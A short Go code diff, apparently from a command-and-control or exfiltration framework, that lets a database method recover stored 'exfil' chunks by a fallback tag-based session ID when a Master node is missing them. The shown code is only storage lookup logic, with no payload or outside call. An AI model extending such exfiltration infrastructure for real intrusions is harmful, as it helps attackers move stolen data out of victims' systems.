@@ -1014,19 +1014,33 @@ func (d *Database) GetLocalTaskChunks(taskID string, chunkIndices []int) map[int
 }
 
 // GetLocalExfilChunks retrieves locally stored chunks for an exfil session that Master is missing
-func (d *Database) GetLocalExfilChunks(sessionID string, chunkIndices []int) map[int][]byte {
+func (d *Database) GetLocalExfilChunks(sessionID string, tag string, chunkIndices []int) map[int][]byte {
 	d.mutex.RLock()
 	defer d.mutex.RUnlock()
 
 	result := make(map[int][]byte)
 	for _, idx := range chunkIndices {
 		var chunk []byte
+		// First try direct session_id lookup
 		err := d.db.QueryRow(`
 			SELECT data FROM exfil_chunks
 			WHERE session_id = ? AND chunk_index = ?
 		`, sessionID, idx).Scan(&chunk)
 		if err == nil && len(chunk) > 0 {
 			result[idx] = chunk
+			continue
+		}
+		
+		// Try tag-based storage (orphan chunks stored as tag_XXX)
+		if tag != "" {
+			tagSessionID := fmt.Sprintf("tag_%s", tag)
+			err = d.db.QueryRow(`
+				SELECT data FROM exfil_chunks
+				WHERE session_id = ? AND chunk_index = ?
+			`, tagSessionID, idx).Scan(&chunk)
+			if err == nil && len(chunk) > 0 {
+				result[idx] = chunk
+			}
 		}
 	}
 	return result
